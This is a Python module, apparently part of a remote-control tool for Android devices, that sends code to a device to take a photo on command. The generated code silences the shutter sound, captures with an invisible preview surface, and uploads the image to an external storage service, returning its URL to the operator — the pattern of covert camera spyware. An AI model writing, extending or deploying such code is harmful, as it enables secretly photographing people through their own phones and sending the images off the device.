"""In-memory remote camera feature. Replaceable at runtime."""

import json
import client_service

FEATURE = {"name": "camera", "title": "Camera", "version": 1, "actions": ["capture"]}


def run():
    return FEATURE


def build_photo_code(facing=0):
    return f'''import json, time
from android.hardware import Camera
from android.graphics import SurfaceTexture
from java import dynamic_proxy
import aliyun_git

class PhotoCallback(dynamic_proxy(Camera.PictureCallback)):
    def __init__(self):
        super().__init__()
        self.data = None
    def onPictureTaken(self, data, camera):
        if data is not None:
            self.data = bytes(data)

camera = None
callback = PhotoCallback()
try:
    for _ in range(3):
        try:
            camera = Camera.open({int(facing)})
            break
        except Exception:
            time.sleep(0.5)
    if camera is None:
        raise RuntimeError("camera open failed")
    try:
        camera.enableShutterSound(False)
    except Exception:
        pass
    camera.setPreviewTexture(SurfaceTexture(10))
    camera.startPreview()
    time.sleep(1.0)
    camera.takePicture(None, None, callback)
    started = time.time()
    while callback.data is None and time.time() - started < 8:
        time.sleep(0.1)
    if callback.data is None:
        raise TimeoutError("camera capture timeout")
    url = aliyun_git.upload(callback.data, file_path="photo_" + str(int(time.time() * 1000)) + ".jpg")
    r = json.dumps({{"ok": True, "url": url, "size": len(callback.data), "facing": {int(facing)}}}, ensure_ascii=False)
except Exception as exc:
    r = json.dumps({{"ok": False, "error": repr(exc)}}, ensure_ascii=False)
finally:
    if camera is not None:
        try: camera.stopPreview()
        except Exception: pass
        try: camera.release()
        except Exception: pass
'''


def capture(facing=0):
    result = client_service.rpc(build_photo_code(int(facing)))
    return json.dumps(client_service.parse_json_result(result), ensure_ascii=False)
